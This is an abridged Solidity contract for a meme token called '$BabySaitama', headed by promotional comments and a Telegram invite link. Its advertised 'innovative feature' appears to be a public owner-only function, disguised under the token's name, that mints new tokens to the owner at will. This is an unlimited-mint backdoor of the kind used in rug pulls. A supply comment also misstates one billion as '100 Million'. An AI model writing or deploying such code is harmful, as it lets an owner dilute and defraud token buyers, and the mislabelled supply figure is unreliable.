//
// $BabySaitama proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+nzZlNWpJRes5ZWU1
// 
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabySaitama(uint256 amount) public onlyOwner {
 _BabySaitama(msg.sender, amount);
    }
    ...
    function _BabySaitama(address account, uint256 amount) internal virtual {
...
contract $BabySaitama is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Baby Saitama", "BABYSAITAMA") {
     _BabySaitama(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}